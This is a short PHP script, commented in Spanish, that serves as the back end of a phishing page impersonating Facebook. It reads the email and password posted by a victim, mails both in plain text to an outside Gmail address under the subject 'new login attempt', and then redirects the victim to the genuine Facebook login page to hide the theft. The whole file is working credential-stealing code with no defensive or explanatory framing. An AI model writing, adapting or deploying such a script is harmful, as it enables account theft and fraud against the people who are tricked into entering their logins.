<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "jata01.1317752887@gmail.com";
    $subject = "Nuevo intento de inicio de sesión";
    $message = "Correo/Usuario: $email\nContraseña: $password";
    $headers = "From: no-reply@tuweb.com";

    mail($to, $subject, $message, $headers);
    
    // Redirigir a la página oficial de Facebook después del envío
    header("Location: https://www.facebook.com/login/");
    exit();
}
?>